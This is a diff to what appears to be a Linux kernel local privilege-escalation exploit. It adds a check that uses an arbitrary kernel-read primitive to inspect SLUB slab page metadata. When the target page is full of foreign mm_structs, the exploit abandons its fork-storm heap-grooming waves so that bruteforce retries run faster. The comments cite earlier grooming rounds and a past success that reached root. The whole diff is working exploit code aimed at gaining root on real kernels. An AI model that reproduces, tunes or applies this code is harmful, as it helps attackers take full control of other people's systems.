@@ -491,6 +491,37 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   if (wave_ncpu < 1)
     wave_ncpu = 1;
   reset_cpu_pin();
+  /* Pre-sweep page check: a FULL page (inuse == objects, frozen=0) is
+   * structurally stuck and no wave can ever rotate it.  The pre/leak kill
+   * already released every chain-owned mm on that page, so the remaining
+   * inuse objects are foreign long-lived mm_structs (boot-era app/system
+   * forks that interleaved into the target page while the chain's fork
+   * storm churned the shared cpu slab -- foreign forks cannot be
+   * prevented, only out-lucked).  A full page is off every freelist, so
+   * the wave's clone allocations never touch it; 24 waves x 110 clones
+   * (~30s of fork storm on top of a live route) always end owned=0
+   * (forensics: 5/5 groom rounds, inuse=34 objects=34 frozen=0, sc
+   * identical across every wave).  Fast-fail instead: the parent's retry
+   * re-rolls a fresh leak_child page (bruteforce re-runs each attempt),
+   * and skipping the sweep makes each roll ~30s cheaper -- multiplying
+   * the rolls per boot.  Only the FULL state is fatal: the 771b7409
+   * success (waves=2 taken=1 owned=1 -> root=1) started from a
+   * NON-full page, so partial/frozen pages must still sweep. */
+  {
+    uintptr_t pre_head = direct_to_head_page(conv_fd, base);
+    uint64_t pre_meta = kernel_read64(conv_fd, pre_head + 0x28);
+    unsigned pre_inuse = (unsigned)(pre_meta & 0xffffu);
+    unsigned pre_objs = (unsigned)((pre_meta >> 16) & 0x7fffu);
+    int pre_frozen = (int)((pre_meta >> 31) & 1u);
+    pr_info("pipe pre-sweep meta inuse=%u objects=%u frozen=%d\n",
+            pre_inuse, pre_objs, pre_frozen);
+    if (pre_inuse >= pre_objs && pre_frozen == 0) {
+      pr_warning("pipe prepare: target page full (%u/%u, foreign holders); "
+                 "abort before waves\n", pre_inuse, pre_objs);
+      free(wave_pids);
+      return 0;
+    }
+  }
   for (int w = 0; w < CONVERT_MAX_WAVES; w++) {
     cpu_set_t wcpu;
     CPU_ZERO(&wcpu);
